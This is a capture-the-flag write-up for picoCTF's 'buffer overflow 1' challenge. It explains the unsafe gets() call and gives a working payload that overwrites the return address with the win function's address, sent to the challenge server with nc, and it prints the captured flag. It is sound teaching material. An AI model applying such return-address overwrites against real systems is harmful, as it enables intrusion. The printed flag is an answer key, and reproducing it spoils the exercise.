
# buffer overflow 1

*Medium*

>### Description
>Control the return address
>Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/187/vuln).
>You can view source [here](https://artifacts.picoctf.net/c/187/vuln.c). And connect with it using:
>```
>nc saturn.picoctf.net 62316
>```


### Solution

The program allows us to input any string. It will be stored in "buf" with a buffersize of 32. But the input uses "gets(buf)", this is unsafe since "gets()" does not check for memory sizes, and thus is not safe against buffer overflows. 

We notice that the characters 45-48 we input are reflected into the return address gathered from the "<get_return_address>" method. I also notice that, if I don't do anything malicious, the return address is just the address given in the disassembled binary. So lets try to inject the address of "<win>" (0x080491f6) into the return address.

Since the application is little endian, we use this payload:

```sh
echo -e "aaaabbbbccccddddaaaabbbbccccddddaaaabbbbcccc\xf6\x91\x04\x08" | nc saturn.picoctf.net 62316
```

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{addr3ss3s_ar3_3asy_b15b081e}
</details>